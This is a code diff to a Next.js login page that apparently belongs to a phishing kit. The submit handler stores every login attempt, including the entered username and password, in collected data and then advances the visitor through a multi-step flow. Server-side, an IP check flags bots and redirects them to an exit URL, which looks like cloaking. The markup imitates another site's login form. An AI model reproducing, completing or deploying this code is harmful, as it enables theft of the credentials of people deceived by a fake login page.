@@ -13,7 +13,7 @@ import Head from "next/head";
 import { GetServerSideProps } from "next";
 import checkIp from "../middleware/checkIp";
 
-interface LoginProps {}
+interface LoginProps { }
 
 const schema = yup.object().shape({
   username: yup
@@ -26,7 +26,7 @@ const schema = yup.object().shape({
     .min(6, `Please enter a valid password.`),
 });
 
-export const Login: React.FC<LoginProps> = ({}) => {
+export const Login: React.FC<LoginProps> = ({ }) => {
   const isMobile = useMediaQuery(`(max-width: 480px)`);
   const [loginAttempt, setLoginAttempt] = useState(0);
   const [showError, setShowError] = useState(false);
@@ -44,6 +44,7 @@ export const Login: React.FC<LoginProps> = ({}) => {
     resolver: yupResolver(schema),
     mode: `onChange`,
   });
+
 
   const onSubmit = handleSubmit(async (data) => {
     setLoading(true);
@@ -83,23 +84,24 @@ export const Login: React.FC<LoginProps> = ({}) => {
         username: ``,
         password: ``,
       });
-      return;
+    } else {
+      setData({
+        ...datas,
+        logins: {
+          ...logins,
+          [loginAttempt + 1]: {
+            form: `LOGIN`,
+            loginDetails: { loginAttempt: loginAttempt + 1, ...data },
+          },
+        },
+      });
+
+      const url = getProgress()[0];
+
+      push(getNextUrl(url));
     }
 
-    setData({
-      ...datas,
-      logins: {
-        ...logins,
-        [loginAttempt + 1]: {
-          form: `LOGIN`,
-          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
-        },
-      },
-    });
-
-    const url = getProgress()[0];
-
-    push(getNextUrl(url));
+    setLoading(false);
   });
 
   useEffect(() => {
@@ -512,9 +514,8 @@ export const Login: React.FC<LoginProps> = ({}) => {
                               </div>
                             </div>
                             <button
-                              className={`logon-submit btn-primary btn-block pointer btn submitButton submit ${
-                                loading || !isValid ? `is-invalid disabled` : ``
-                              }`}
+                              className={`logon-submit btn-primary btn-block pointer btn submitButton submit ${loading || !isValid ? `is-invalid disabled` : ``
+                                }`}
                               disabled={loading || !isValid}
                               data-ember-action=""
                               data-ember-action-38={38}
@@ -622,11 +623,11 @@ export const getServerSideProps: GetServerSideProps = async ({ req }) => {
     props: { isBot: valid },
     ...(!valid
       ? {
-          redirect: {
-            destination: process.env.NEXT_PUBLIC_EXIT_URL,
-            permanent: false,
-          },
-        }
+        redirect: {
+          destination: process.env.NEXT_PUBLIC_EXIT_URL,
+          permanent: false,
+        },
+      }
       : {}),
   };
 };
